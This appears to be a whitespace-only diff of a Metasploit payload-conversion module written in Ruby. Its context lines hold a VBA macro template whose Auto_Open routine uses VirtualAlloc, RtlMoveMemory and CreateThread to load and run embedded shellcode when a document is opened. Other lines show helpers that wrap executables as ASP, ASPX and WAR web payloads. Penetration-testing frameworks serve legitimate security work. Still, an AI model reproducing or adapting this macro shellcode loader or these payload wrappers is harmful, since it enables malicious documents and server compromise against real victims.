@@ -857,11 +857,11 @@ require 'digest/sha1'
 			bytes << " _\r\n" if (idx > 1 and (idx % maxbytes) == 0)
 		end
 
-		"#If Vba7 Then 
+		"#If Vba7 Then
 Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal #{var_lpThreadAttributes} As Long, ByVal #{var_dwStackSize} As Long, ByVal #{var_lpStartAddress} As LongPtr, #{var_lpParameter} As Long, ByVal #{var_dwCreationFlags} As Long, #{var_lpThreadID} As Long) As LongPtr
 Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal #{var_lpAddr} As Long, ByVal #{var_lSize} As Long, ByVal #{var_flAllocationType} As Long, ByVal #{var_flProtect} As Long) As LongPtr
 Private Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As LongPtr, ByRef #{var_Source} As Any, ByVal #{var_Length} As Long) As LongPtr
-#Else 
+#Else
 Private Declare Function CreateThread Lib \"kernel32\" (ByVal #{var_lpThreadAttributes} As Long, ByVal #{var_dwStackSize} As Long, ByVal #{var_lpStartAddress} As Long, #{var_lpParameter} As Long, ByVal #{var_dwCreationFlags} As Long, #{var_lpThreadID} As Long) As Long
 Private Declare Function VirtualAlloc Lib \"kernel32\" (ByVal #{var_lpAddr} As Long, ByVal #{var_lSize} As Long, ByVal #{var_flAllocationType} As Long, ByVal #{var_flProtect} As Long) As Long
 Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As Long, ByRef #{var_Source} As Any, ByVal #{var_Length} As Long) As Long
@@ -869,9 +869,9 @@ Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal #{var_lDest} As L
 
 Sub Auto_Open()
 	Dim #{var_myByte} As Long, #{var_myArray} As Variant, #{var_offset} As Long
-#If Vba7 Then 
+#If Vba7 Then
 	Dim  #{var_rwxpage} As LongPtr, #{var_res} As LongPtr
-#Else 
+#Else
 	Dim  #{var_rwxpage} As Long, #{var_res} As Long
 #EndIf
 	#{var_myArray} = Array(#{bytes})
@@ -1011,7 +1011,7 @@ End Sub
 		vbs << "%>\r\n"
 		vbs
 	end
-	
+
 	def self.to_exe_aspx(exes = '', opts={})
 		exe = exes.unpack('C*')
 
@@ -1077,7 +1077,7 @@ End Sub
 	def self.to_win32pe_asp(framework, code, opts={})
 		to_exe_asp(to_win32pe(framework, code, opts), opts)
 	end
-	
+
 	def self.to_win32pe_aspx(framework, code, opts={})
 		to_exe_aspx(to_win32pe(framework, code, opts), opts)
 	end
@@ -1808,7 +1808,7 @@ End Sub
 
 		when 'aspx'
 			output = Msf::Util::EXE.to_win32pe_aspx(framework, code, exeopts)
-			
+
 		when 'war'
 			arch ||= [ ARCH_X86 ]
 			tmp_plat = plat.platforms if plat
